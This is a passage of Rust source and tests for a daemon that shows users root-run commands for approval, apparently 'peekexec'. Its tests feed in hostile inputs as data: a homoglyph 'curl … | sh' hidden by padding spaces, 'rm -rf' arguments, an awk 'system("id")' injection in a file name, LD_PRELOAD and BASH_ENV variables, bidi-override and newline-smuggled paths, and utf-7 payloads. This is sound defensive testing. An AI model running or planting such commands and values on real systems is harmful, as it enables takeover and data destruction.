    std::fs::DirBuilder::new()
        .mode(0o700)
        .create(dir)
        .map_err(err)?;
    let mut f = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o500)
        .open(file)
        .map_err(err)?;
    std::io::Write::write_all(&mut f, content).map_err(err)
}

/// Process details are under the control of whoever runs the process, so
/// they are escaped, and `trusted` says whether the executable is a
/// root-owned file that only root could have put there.
pub fn proc_line(p: &ProcessInfo) -> ProcLine {
    let trusted = p
        .exe
        .as_deref()
        .is_some_and(|e| trust::check(Path::new(e), &[0]).is_ok());
    ProcLine {
        pid: p.pid,
        exe: p.exe.as_deref().map(|e| display_line(e, 200)),
        cmdline: p.cmdline.iter().map(|a| display_line(a, 200)).collect(),
        trusted,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::os::unix::fs::PermissionsExt;

    fn req(action: Action) -> Request {
        Request {
            action,
            why: None,
            write: None,
            no_net: false,
            env: BTreeMap::new(),
            cwd: "/".into(),
            timeout_secs: 120,
        }
    }

    #[test]
    fn env_is_an_allowlist() {
        let with = |k: &str, v: &str| {
            let mut r = req(Action::Run {
                argv: vec!["true".into()],
            });
            r.env.insert(k.into(), v.into());
            validate(&r)
        };
        for k in [
            "LD_PRELOAD",
            "PATH",
            "BASH_ENV",
            "PYTHONPATH",
            "GIT_CONFIG_GLOBAL",
            "PAGER",
            "JAVA_TOOL_OPTIONS",
            "BASH_FUNC_x%%",
            "LC_X\nRuns as: nobody",
            "LC_ALL=/home/u/x",
            "LC_",
        ] {
            assert!(with(k, "x").is_err(), "{k} accepted");
        }
        assert!(with("DEBIAN_FRONTEND", "noninteractive").is_ok());
        assert!(with("LC_ALL", "C.UTF-8").is_ok());
        assert!(
            with("TZ", ":/home/u/zone").is_err(),
            "path in value accepted"
        );
        assert!(with("LANG", "/home/u/locale").is_err());
    }

    #[test]
    fn enter_approves_only_plain_runs() {
        let run = |argv: &[&str]| {
            req(Action::Run {
                argv: argv.iter().map(|a| a.to_string()).collect(),
            })
        };
        let plain = |r: &Request| plain_run(r, &prepare_for_tests(r).exec);
        assert!(plain(&run(&["true"])));
        assert!(plain(&run(&["ls", "-l", "/etc"])));
        // A name that only starts like an interpreter's is not one.
        assert!(plain(&run(&["ls", "/usr/share/shells"])));
        for code in [
            &["sh", "-c", "id"][..],
            &["/usr/bin/python3", "-c", "print(1)"],
            &["perl", "-e", "1"],
            &["env", "true"],
            &["echo", "two words"],
            &["echo", "a\nb"],
            &["timeout", "9", "sh", "-c", "id"],
            &["nice", "/usr/bin/python3.12", "x"],
            &["ls", "perl5.34-x86_64-linux-gnu"],
            &["echo", "rm${IFS}-rf"],
            &["echo", "a;b"],
        ] {
            assert!(!plain(&run(code)), "{code:?}");
        }
        let script = req(Action::Script {
            path: "/home/u/x.sh".into(),
            content: b"#!/bin/sh\ntrue\n".to_vec(),
            args: vec![],
        });
        assert!(!plain(&script));
        let install = req(Action::Install {
            src: "x.conf".into(),
            content: b"x\n".to_vec(),
            dest: "/etc/peekexec-test-nonexistent.conf".into(),
        });
        assert!(!plain(&install));
    }

    #[test]
    fn why_cannot_fake_lines() {
        assert_eq!(
            display_line("ok\nRuns as: nobody", 300).as_str(),
            "ok⟨U+000A⟩Runs as: nobody"
        );
        assert_eq!(display_line("abcdef", 3).as_str(), "abc…");
        assert_eq!(display_line("café", 300).as_str(), "café");
    }

    #[test]
    fn an_argument_cannot_pass_for_several() {
        let r = req(Action::Run {
            argv: ["chmod", "0755", "/usr/local/bin\nargv[3] /tmp/harmless"]
                .map(String::from)
                .to_vec(),
        });
        let p = prepare_for_tests(&r);
        let s = &p.view.sections[0];
        assert_eq!(s.raw.lines().count(), 3, "{}", s.raw);
        assert!(s.raw.contains("⟨U+000A⟩"), "{}", s.raw);
        assert_eq!(s.formatted.len(), 1);
        assert!(!p.view.enter_approves);

        let mut r = req(Action::Run {
            argv: vec!["true".into()],
        });
        r.write = Some(vec!["/etc/motd\nnetwork: blocked".into()]);
        assert!(validate(&r).unwrap_err().contains("control characters"));
        for dest in [
            "/etc/motd\nno network",
            "/etc/\u{200B}motd",
            "/etc/\u{202E}dtom",
        ] {
            let r = req(Action::Install {
                src: "motd".into(),
                content: b"hi\n".to_vec(),
                dest: dest.into(),
            });
            assert!(validate(&r).unwrap_err().contains("hidden"), "{dest:?}");
        }
        let r = req(Action::Install {
            src: "tool".into(),
            content: b"#!/usr/bin/python3\n# coding: utf-7\n# +AAo-import os\n".to_vec(),
            dest: "/usr/local/bin/tool".into(),
        });
        assert!(validate(&r).unwrap_err().contains("utf-7"));
        // Into a directory the name comes from `src`: held to the same rule.
        let r = req(Action::Install {
            src: "/home/u/evil\u{202E}hs.txt\nline".into(),
            content: b"hi\n".to_vec(),
            dest: "/etc/cron.d".into(),
        });
        assert!(validate(&r).unwrap_err().contains("hidden"));
    }

    #[test]
    fn script_arguments_are_lines_of_their_own() {
        // Arguments after `sh -c SCRIPT`: one escaped line each, in full.
        let long = "x".repeat(1000);
        let argv: Vec<String> = ["sh", "-c", "true", "name\nRuns as: nobody", "", &long]
            .map(String::from)
            .to_vec();
        let s = run_section(&argv, "/usr/bin/dash");
        let lines: Vec<&str> = s.invocation.iter().map(Shown::as_str).collect();
        assert_eq!(lines[2], "argv[2] (the script below)");
        assert_eq!(lines[3], "argv[3] name⟨U+000A⟩Runs as: nobody");
        assert_eq!(lines[4], "argv[4] ", "an empty argument is visible");
        assert!(lines[5].ends_with(&long), "never cut");

        // A long label comes after the arguments.
        let r = req(Action::Script {
            path: format!("/home/u/{}.sh", "y".repeat(500)),
            content: b"exec \"$@\"\n".to_vec(),
            args: vec!["rm".into(), "-rf".into(), "/".into()],
        });
        let p = prepare_for_tests(&r);
        let lines: Vec<&str> = p.view.sections[0]
            .invocation
            .iter()
            .map(Shown::as_str)
            .collect();
        assert_eq!(&lines[2..5], ["argv[2] rm", "argv[3] -rf", "argv[4] /"]);
        assert!(lines[5].starts_with("the requester calls the script"));
        let m = system_prompt_message(&p.view).unwrap();
        assert!(m.contains("  argv[4] /\n"), "{m}");
        assert!(!p.view.enter_approves || p.view.findings() == 0);

        let mut r = req(Action::Run {
            argv: vec!["true".into()],
        });
        r.write = Some(vec!["/etc/\u{202E}dwssap".into()]);
        assert!(validate(&r).is_err(), "bidi override accepted in --write");
    }

    #[test]
    fn shell_c_gets_formatted_section() {
        let argv: Vec<String> = ["sh", "-c", "a && b"].map(String::from).to_vec();
        let s = run_section(&argv, "/usr/bin/dash");
        assert_eq!(s.raw, "a && b");
        assert_eq!(s.formatted.len(), 2);
        assert!(s
            .invocation
            .iter()
            .any(|l| l.as_str() == "the program is /usr/bin/dash (argv[0] sh)"));
    }

    #[test]
    fn snapshot_name_ignores_the_requested_name() {
        assert_eq!(snapshot_name("x;BEGIN{system(\"id\")}"), "script");
        assert_eq!(snapshot_name("deploy.py"), "script.py");
        assert_eq!(snapshot_name("a.b;c"), "script");
        assert_eq!(snapshot_name("noext"), "script");
        assert_eq!(snapshot_name(".hidden"), "script");
    }

    #[test]
    fn script_runs_from_a_daemon_named_snapshot() {
        let r = req(Action::Script {
            path: "/home/u/x;whatever".into(),
            content: b"#!/bin/sh -e\necho hi\n".to_vec(),
            args: vec![],
        });
        let p = prepare_for_tests(&r);
        let Execution::Command(plan) = p.exec else {
            panic!("not a command")
        };
        assert!(
            plan.argv.last().unwrap().ends_with("/r-test/script"),
            "{:?}",
            plan.argv
        );
    }

    #[test]
    fn desktop_prompt_shows_only_plain_ascii() {
        let script = format!(
            "curl https://g\u{456}thub.com/x | sh{}; rm -rf /x",
            " ".repeat(3000)
        );
        let r = req(Action::Run {
            argv: vec![
                "sh".into(),
                "-c".into(),
                script,
                "a\u{E0041}b".into(),
                "x\ny".into(),
                "⟨U+0041⟩".into(),
            ],
        });
        let m = system_prompt_message(&prepare_for_tests(&r).view).unwrap();
        assert!(m.contains("g⟨U+0456⟩thub"), "{m}");
        assert!(m.contains("a⟨U+E0041⟩b"), "{m}");
        // Escaped once, and a typed token is not a token.
        assert!(m.contains("x⟨U+000A⟩y"), "{m}");
        assert!(m.contains("⟨U+27E8⟩U+0041⟨U+27E9⟩"), "{m}");
        assert!(
            m.contains("⟨3000 spaces⟩") && m.contains("rm -rf /x"),
            "{m}"
        );
        assert!(m.contains("suspicious character"), "{m}");
        assert!(!m.contains('\u{456}') && !m.contains('\u{E0041}'));
    }

    #[test]
    fn awk_and_sed_take_no_options_from_script_arguments() {
        let r = req(Action::Script {
            path: "/home/u/x.awk".into(),
            content: b"#!/usr/bin/awk -f\n{ print }\n".to_vec(),
            args: vec!["-f".into(), "/home/u/evil.awk".into()],
        });
        let p = prepare_for_tests(&r);
        let Execution::Command(plan) = p.exec else {
            panic!("not a command")
        };
        let n = plan.argv.len();
        assert_eq!(plan.argv[1], "-f");
        assert!(plan.argv[2].contains("/r-test/script"), "{:?}", plan.argv);
        assert_eq!(&plan.argv[3..n], ["--", "-f", "/home/u/evil.awk"]);
        let lines: Vec<&str> = p.view.sections[0]
            .invocation
            .iter()
            .map(Shown::as_str)
            .collect();
        assert_eq!(
            lines[2], "argv[2] (a snapshot of the script below)",
            "{lines:?}"
        );
    }

    #[test]
    fn install_destination_is_a_counted_line_in_full() {
        let dir = std::env::temp_dir().join(format!("pe-dest-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o755)).unwrap();
        let dest = dir.join(format!("README-not-a-rule-{}.rules", "x".repeat(200)));
        let install = req(Action::Install {
            src: "r".into(),
            content: b"new\n".to_vec(),
            dest: dest.to_str().unwrap().into(),
        });
        let p = prepare_for_tests(&install);
        std::fs::remove_dir_all(&dir).unwrap();
        let line = format!("writes {}", dest.display());
        assert_eq!(p.view.sections[0].invocation[0].as_str(), line);
        let m = system_prompt_message(&p.view).unwrap();
        assert!(m.contains(".rules"), "{m}");
    }

    #[test]
    fn install_never_shows_what_the_user_cannot_read() {
        if nix::unistd::geteuid().is_root() {
            return;
        }
        let dir = std::env::temp_dir().join(format!("pe-unread-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o755)).unwrap();
        let dest = dir.join("secret.conf");
        std::fs::write(&dest, "secret-line\n").unwrap();
        let install = req(Action::Install {
            src: "new.conf".into(),
            content: b"new\n".to_vec(),
            dest: dest.to_str().unwrap().into(),
        });
        // Readable by the requester: the diff is shown.
        let shown = prepare_for_tests(&install);
        assert!(shown
            .view
            .sections
            .iter()
            .any(|s| s.raw.contains("secret-line")));
        // Not readable by the requester (this test process, whose authority
        // inspection uses): nothing of it is shown.
        std::fs::set_permissions(&dest, std::fs::Permissions::from_mode(0o000)).unwrap();
        let hidden = prepare_for_tests(&install);
        std::fs::set_permissions(&dest, std::fs::Permissions::from_mode(0o600)).unwrap();
        let text = serde_json::to_string(&hidden.view).unwrap();
        assert!(!text.contains("secret-line"), "{text}");
        assert!(!text.contains("No changes"), "{text}");
        assert!(
            hidden.view.notes.iter().any(|n| n
                .contains("whose current content cannot be read without root, so it is not shown")),
            "{:?}",
            hidden.view.notes
        );
        std::fs::remove_dir_all(&dir).unwrap();
    }

    fn prepare_for_tests(r: &Request) -> Prepared {
        let uid = nix::unistd::getuid().as_raw();
        let gid = nix::unistd::getgid().as_raw();
        #[cfg(target_os = "linux")]
        let sandbox = crate::platform::linux::Namespaces;
        #[cfg(not(target_os = "linux"))]
        let sandbox = crate::platform::macos::Unported;
        let ctx = Ctx {
            sandbox: &sandbox,
            inspect: &crate::inspect::inspect,
            wants_password: true,
            dev: true,
            snapshot_root: Path::new("/nonexistent/peekexec-tests"),
        };
        let peer = Peer {
            uid,
            gid,
            process: ProcessInfo {
                pid: 1,
                exe: None,
                cmdline: vec![],
                start_time: None,
            },
            cwd: None,
            ancestry: vec![],
            pinned: true,
        };
        let user = User {
            name: "u".into(),
            home: "/home/u".into(),
            uid,
            gid,
            groups: vec![gid],
        };
        let display = Display {
            vars: vec![],
            tier: peekexec_proto::DisplayTier::X11,
            verified: true,
        };
        prepare(&ctx, &peer, &user, r, "r-test", &display, false).unwrap()
    }

    #[test]
    fn system_prompt_message_carries_the_facts() {
        let mut v = PromptView {
            kind: ViewKind::Root,
            approval: Approval::Password,
            provenance: Provenance::Unregistered,
            request_id: "r-1".into(),
            sha256: "3f9a1c0000000000000000000000000000000000000000000000000000c21e".into(),
            requester: vec![],
            requester_user: Shown::fixed("u"),
            pinned: true,
            cwd: Shown::fixed("/"),
            run_as: Shown::fixed("root"),
            dev_mode: false,
            why: Some(Shown::fixed("ignored: only daemon facts go in")),
            enforced: Enforced {
                write: Some(vec!["/etc/udev/rules.d".into()]),
                write_level: Level::DeclaredOnly,
                network: false,
                network_level: Level::BestEffort,
            },
            display_tier: peekexec_proto::DisplayTier::Wayland,
            display_verified: false,
            env: vec![],
            sections: vec![run_section(
                &["sh", "-c", "a && b; c; d; e; f $("].map(String::from),
                "/usr/bin/dash",
            )],
            notes: vec![
                display_line(&format!("{UNVERIFIED_NOTE}: x"), 300),
                Shown::fixed("Touches /etc/sudoers*"),
            ],
            timeout_secs: 60,
            wants_password: true,
            input_guard_ms: 400,
            enter_approves: false,
            approve_delay_ms: 0,
        };
        assert!(SYSTEM_PROMPT_NOTE_TEXT.starts_with(SYSTEM_PROMPT_NOTE));
        use_system_prompt(&mut v);
        assert_eq!(v.approval, Approval::SystemPrompt);
        assert!(!v.wants_password);
        let m = system_prompt_message(&v).unwrap();
        assert!(m.starts_with("peekexec: run this as root?"));
        assert!(m.contains("    a &&"), "{m}");
        assert!(m.contains("    f $("), "all six lines fit: {m}");
        assert!(m.contains("writes /etc/udev/rules.d"), "{m}");
        assert!(m.contains("⚠ Touches /etc/sudoers*"), "{m}");
        assert!(!m.contains(UNVERIFIED_NOTE), "{m}");
        assert!(!m.contains("ignored"), "why must not be in the prompt: {m}");
        assert!(m.ends_with("request sha256 3f9a1c000000…"), "{m}");

        // The variables root gets are in the prompt.
        v.env = vec![(
            Shown::fixed("DEBIAN_FRONTEND"),
            Shown::fixed("noninteractive"),
        )];
        let m = system_prompt_message(&v).unwrap();
        assert!(m.contains("\nenv: DEBIAN_FRONTEND=noninteractive\n"), "{m}");
        // The daemon's facts and warnings come before anything the
        // requester sent: the command, then its variables.
        let facts = m.find("writes /etc/udev/rules.d").unwrap();
        let warning = m.find("⚠ Touches").unwrap();
        let command = m.find("    a &&").unwrap();
        let env = m.find("env: DEBIAN").unwrap();
        assert!(facts < command && warning < command && command < env, "{m}");
        v.env.clear();

        // Too long for the prompt: refused, not shown in part.
        let script: String = (0..30).map(|i| format!("step{i}\n")).collect();
        v.sections = vec![run_section(
            &["sh".into(), "-c".into(), script],
            "/usr/bin/dash",
        )];
        assert_eq!(system_prompt_message(&v), Err(18));
        assert!(too_long_for_system_prompt(18).contains("18 lines"));

        // A long line wraps; nothing is cut off.
        let long = format!("apt-get install -y {}evil-tail", "pkg ".repeat(60));
        v.sections = vec![run_section(
            &["sh".into(), "-c".into(), long],
            "/usr/bin/dash",
        )];
        let m = system_prompt_message(&v).unwrap();
        assert!(m.contains("evil-tail"), "{m}");

        // Every warning is listed.
        v.notes = (0..6)
            .map(|i| display_line(&format!("warning {i}"), 100))
            .collect();
        let m = system_prompt_message(&v).unwrap();
        assert!(m.contains("⚠ warning 5"), "{m}");

        // A script's indentation is part of what runs: shown as a count,
        // never dropped. Lines of nothing but spaces are left out; other
        // whitespace is a visible token.
        v.sections = vec![Section {
            title: Shown::fixed("job.py"),
            invocation: vec![],
            syntax: Syntax::Plain,
            formatted: verbatim("if ok:\n    guarded()\n   \nunguarded()\n\u{a0}x\n\tr\n"),
            raw: String::new(),
        }];
        let m = system_prompt_message(&v).unwrap();
        assert!(m.contains("\n    ⟨4 spaces⟩guarded()\n"), "{m}");
        assert!(m.contains("\n    unguarded()\n"), "{m}");
        assert!(m.contains("\n    ⟨U+00A0⟩x\n"), "{m}");
        assert!(m.contains("\n    ⟨U+0009⟩r\n"), "{m}");
        assert!(!m.contains("\n       \n"), "{m}");

        // The same inside `sh -c`, where the formatter indents lines after
        // `&&` and inside blocks: a heredoc keeps its own indentation.
        let code = "true && python3 - <<'E'\nif ok:\n    guarded()\nunguarded()\nE\n";
        v.sections = vec![run_section(
            &["sh".into(), "-c".into(), code.into()],
            "/usr/bin/dash",
        )];
        let m = system_prompt_message(&v).unwrap();
        assert!(m.contains("\n    ⟨4 spaces⟩guarded()\n"), "{m}");
        assert!(m.contains("\n    unguarded()\n"), "{m}");
    }

    #[test]
    fn flags_sensitive_targets() {
        let e = Enforced {
            write: Some(vec!["/etc/sudoers.d/x".into()]),
            write_level: Level::Builtin,
            network: false,
            network_level: Level::Builtin,
        };
        let note = sensitive_targets(&[], &e).unwrap();
        assert!(note.contains("/etc/sudoers"));
        // Many hits are still one note.
        let e = Enforced {
            write: Some(vec!["/etc/sudoers.d/x".into(), "/etc/cron.d/y".into()]),
            ..e
        };
        let note = sensitive_targets(&[], &e).unwrap();
        assert!(note.contains("/etc/sudoers*, /etc/cron*"), "{note}");
        // Redundant slashes and dots do not hide a path.
        for p in [
            "/etc//cron.d/x",
            "/etc/./cron.d/x",
            "/etc/foo/../cron.d/x",
            "/usr/local/bin/apt",
            "/etc/sysctl.d/99-x.conf",
            "/usr/bin/apt",
            "/root/.config/x",
        ] {
            let e = Enforced {
                write: Some(vec![p.into()]),
                ..e.clone()
            };
            assert!(sensitive_targets(&[], &e).is_some(), "{p}");
        }
        // In the command text: `..` too; program directories only as targets.
        let section = |raw: &str| Section {
            title: Shown::fixed("t"),
            invocation: vec![],
            syntax: Syntax::Shell,
            formatted: verbatim(raw),
            raw: raw.into(),
        };
        let none = Enforced {
            write: Some(vec![]),
            ..e.clone()
        };
        let hit = sensitive_targets(&[section("cp x '/etc/a/../cron.d/y'")], &none).unwrap();
        assert!(hit.contains("/etc/cron"), "{hit}");
        assert!(sensitive_targets(&[section("#!/usr/bin/env sh\n/usr/bin/true")], &none).is_none());
        assert_eq!(
            normalize_paths("a=/x/./y//z/../w b/../c", false),
            "a=/x/y/w b/../c"
        );
        // /bin is usr/bin on merged-/usr systems.
        let w = |p: &str| Enforced {
            write: Some(vec![p.into()]),
            ..none.clone()
        };
        for p in [
            "/bin/../share/polkit-1/rules.d/00.rules",
            "/bin/../local/bin/apt",
            "/usr/share/polkit-1/rules.d/../../../../bin/../share/polkit-1/rules.d/x",
        ] {
            assert!(sensitive_targets(&[], &w(p)).is_some(), "{p}");
        }
    }

    #[test]
    fn binary_install_is_described_not_shown() {
        let mut notes = Vec::new();
        let s = install_section(
            "/usr/local/bin/x",
            vec![],
            b"\x7fELF\x02\x01\x00junk",
            &mut notes,
        );
        assert!(s.raw.starts_with("Not text: an executable program"));
        assert_eq!(notes.len(), 1);
    }
}
